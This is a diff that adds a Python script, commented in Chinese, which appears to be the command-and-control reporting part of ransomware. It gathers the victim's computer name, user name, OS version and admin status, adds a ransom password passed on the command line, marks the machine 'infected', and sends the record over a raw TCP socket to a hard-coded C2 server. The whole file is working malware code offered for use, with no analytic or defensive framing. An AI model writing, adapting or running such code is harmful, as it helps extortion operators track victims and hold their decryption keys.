@@ -1,0 +1,84 @@
+import sys
+import json
+import socket
+import time
+import os
+
+C2_SERVER = "192.168.0.1"
+C2_PORT = 8080
+C2_ENABLED = True  # 改成 False 就关闭
+
+def get_machine_info():
+    """收集本机基础信息"""
+    info = {
+        "computer_name": os.environ.get("COMPUTERNAME", "UNKNOWN"),
+        "user_name": os.environ.get("USERNAME", "UNKNOWN"),
+        "system_drive": os.environ.get("SystemDrive", "C:"),
+        "os_version": "",
+        "is_admin": False
+    }
+    # 尝试获取更详细的信息
+    try:
+        import platform
+        info["os_version"] = platform.platform()
+    except:
+        pass
+    try:
+        import ctypes
+        info["is_admin"] = ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        pass
+    return info
+
+def send_to_c2(data, timeout=5):
+    """向C2服务器发送JSON数据"""
+    if not C2_ENABLED:
+        print("[C2] Disabled, nothing sent")
+        return False
+    
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((C2_SERVER, C2_PORT))
+        payload = json.dumps(data, ensure_ascii=False)
+        sock.sendall(payload.encode('utf-8'))
+        
+        # 接收回复（可选）
+        response = sock.recv(1024)
+        print(f"[C2] Server replied: {response.decode('utf-8', errors='ignore')}")
+        sock.close()
+        return True
+    except socket.timeout:
+        print(f"[C2] Connection to {C2_SERVER}:{C2_PORT} timed out")
+        return False
+    except ConnectionRefusedError:
+        print(f"[C2] Connection refused by {C2_SERVER}:{C2_PORT}")
+        return False
+    except Exception as e:
+        print(f"[C2] Failed to send: {e}")
+        return False
+
+def main():
+    # 从命令行参数获取信息
+    ransom_password = sys.argv[1] if len(sys.argv) > 1 else "unknown"
+    system_drive = sys.argv[2] if len(sys.argv) > 2 else "C:"
+    
+    # 收集信息
+    info = get_machine_info()
+    info["ransom_password"] = ransom_password
+    info["system_drive"] = system_drive
+    info["timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
+    info["status"] = "infected"
+    
+    print(f"[C2] Preparing report:")
+    print(json.dumps(info, ensure_ascii=False, indent=2))
+    
+    # 发送
+    success = send_to_c2(info)
+    if success:
+        print("[C2] Report sent successfully")
+    else:
+        print("[C2] Report failed (server may be offline)")
+
+if __name__ == "__main__":
+    main()
